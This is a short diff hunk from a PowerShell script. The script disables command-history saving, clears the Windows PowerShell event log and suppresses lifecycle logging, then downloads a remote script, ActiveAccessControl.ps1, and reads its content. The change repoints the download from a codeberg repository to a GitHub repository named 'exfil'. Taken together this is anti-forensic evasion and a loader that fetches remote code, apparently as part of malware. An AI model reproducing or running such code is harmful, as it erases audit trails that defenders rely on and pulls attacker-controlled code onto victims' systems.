@@ -39,7 +39,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$url = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/ActiveAccessControl.ps1"
+$url = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/ActiveAccessControl.ps1"
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 if ($response.StatusCode -eq 200) {
 $scriptContent = $response.Content
